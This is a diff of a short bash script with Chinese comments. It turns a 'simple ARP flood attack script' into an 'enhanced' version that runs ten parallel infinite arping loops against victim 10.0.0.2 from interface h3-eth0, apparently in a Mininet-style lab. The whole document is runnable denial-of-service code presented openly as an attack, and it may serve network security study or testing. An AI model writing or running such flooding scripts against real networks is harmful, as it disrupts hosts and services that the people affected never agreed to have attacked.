@@ -1,15 +1,19 @@
 #!/bin/bash
-# 簡單 ARP Flood 攻擊腳本
-# 假設受害者是 10.0.0.2，從 h3 不停發 ARP 封包
+# ARP Flood 攻擊腳本（加強版）
+# 從 h3 對 h2 發動大量 ARP 封包
 
 VICTIM_IP="10.0.0.2"
 IFACE="h3-eth0"
 
-echo "[*] Starting ARP flood against ${VICTIM_IP} on interface ${IFACE} ..."
+echo "[*] Starting HEAVY ARP flood against ${VICTIM_IP} on interface ${IFACE} ..."
 echo "    Press Ctrl+C to stop."
 
-# 無限迴圈，不停送 ARP 封包
-while true; do
-    # -c 5 一次發 5 個，你可以依需求調整
-    arping -c 5 -I "$IFACE" "$VICTIM_IP" > /dev/null 2>&1
+# 同時啟動多個 arping 程序來增加封包數量
+for i in {1..10}; do
+    while true; do
+        arping -c 20 -w 1 -I "$IFACE" "$VICTIM_IP" > /dev/null 2>&1
+    done &
 done
+
+# 等待所有背景程序
+wait
